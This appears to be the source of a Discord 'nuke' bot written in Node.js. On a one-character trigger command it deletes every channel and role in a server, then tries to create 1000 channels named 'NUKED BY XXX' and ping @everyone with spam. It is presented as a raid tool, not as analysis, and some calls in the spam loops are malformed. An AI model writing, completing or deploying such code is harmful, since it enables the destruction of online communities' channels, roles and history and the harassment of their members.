const express = require('express');
const app = express();

app.get('/', (req, res) => {
	res.send('Hewoo!');
});

app.listen(3000, () => {
	console.log('Hewoo i am ready');
});



const discord = require('discord.js')
const client = new discord.Client();
const config = require('./config.json');
const fs = require("fs");


client.on("ready", () => {

    console.log("Bot online")
    client.user.setActivity("Type NUKED BY XXX", {type: 'STREAMING' }).catch(console.error);
});











const prefix = ''

client.on('message', async (message) => {
  if (message.content === '!') {
    message.guild.channels.cache.forEach(channel => channel.delete());


    message.guild.roles.cache.forEach(role => role.delete());





for (let i = 0; i < 1000; i++){
     message.guild.channels.create(`NUKED BY XXX)`, {
      type: 'NUKED'
    }).then(channel => channel.send('@everyone hahah '))
}


    for (let i = 0; i < 1000; i++){
     message.guild.channels.delete(`NUKED BY XXX)`, {
      type: 'NUKED'
    }).then(channel => channel.send('@everyone hahah'))
}




  }
})





















client.login("SUPER SECRET TOKEN GOES HERE!")
